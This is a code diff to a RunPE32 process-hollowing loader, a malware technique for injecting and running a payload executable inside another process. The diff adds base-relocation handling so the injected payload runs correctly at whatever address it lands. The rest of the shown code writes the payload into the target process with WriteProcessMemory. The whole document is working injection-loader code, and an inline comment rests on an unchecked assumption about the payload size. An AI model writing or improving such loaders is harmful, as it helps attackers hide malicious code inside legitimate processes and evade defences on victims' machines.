@@ -1,4 +1,5 @@
 #include "runpe.h"
+#include "applyReloc.h"
 #include <stdio.h>
 
 // RunPE32 implementation based on the simpler RunPortableExecutable approach
@@ -123,6 +124,23 @@ extern "C" int RunPE32(wchar_t* targetPath, unsigned char* payload, size_t paylo
 	}
 
 	printf("Allocated memory at: %p\n", pImageBase);
+
+	// Apply relocations if the image was loaded at a different base address
+	if ((uint64_t)pImageBase != (uint64_t)(NtHeader->OptionalHeader.ImageBase)) {
+		printf("Relocating image from 0x%p to 0x%p\n",
+			(void*)NtHeader->OptionalHeader.ImageBase, (void*)pImageBase);
+
+		if (!applyReloc((uint64_t)pImageBase,
+						(uint64_t)(NtHeader->OptionalHeader.ImageBase),
+						payload,
+						payload_size)) { // Assuming payload_size is the full size of the mapped module
+			printf("Error: Failed to apply relocations\n");
+			TerminateProcess(PI.hProcess, 0);
+			CloseHandle(PI.hThread);
+			CloseHandle(PI.hProcess);
+			return 0;
+		}
+	}
 
 	// Write the headers to the target process
 	if (!WriteProcessMemory(PI.hProcess, pImageBase, payload, NtHeader->OptionalHeader.SizeOfHeaders, NULL)) {
